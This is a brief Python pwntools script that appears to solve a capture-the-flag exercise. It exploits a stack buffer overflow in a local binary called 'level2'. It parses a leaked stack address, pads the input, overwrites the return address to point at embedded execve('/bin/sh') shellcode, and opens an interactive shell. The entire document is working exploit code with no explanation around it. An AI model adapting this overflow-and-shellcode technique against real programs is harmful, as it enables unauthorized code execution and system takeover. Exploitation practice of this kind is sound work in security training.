from pwn import *
shell_code = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
conn = process('./level2')
addr = conn.recvuntil(']')
add = int(addr[-13:-1],16)               
shellcode_add = p64(add + 24 + 8)
v = 24*"a" + shellcode_add + shell_code
conn.send(v+'\n')
conn.interactive()
